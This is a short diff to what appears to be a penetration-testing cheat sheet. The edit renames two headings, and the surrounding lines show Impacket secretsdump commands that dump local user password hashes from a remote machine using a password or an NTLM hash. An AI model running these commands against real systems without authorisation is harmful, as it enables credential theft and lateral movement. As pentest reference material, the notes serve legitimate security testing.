@@ -39,11 +39,11 @@ date: 2022-12-10
 
     python3 secretsdump.py <Domain>/<Domain Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
     
-### Impacket secretsdump - DUMP Local User Hashes via Domain Local User Creds
+### Impacket secretsdump - DUMP Local User Hashes via Local User Creds
     
     python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> (Enter with Local Creds)
     
-### Impacket secretsdump - DUMP Local User Hashes via Domain Local User Hash
+### Impacket secretsdump - DUMP Local User Hashes via Local User Hash
 
     python3 secretsdump.py <Computer_Hostname>/<Local Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
     
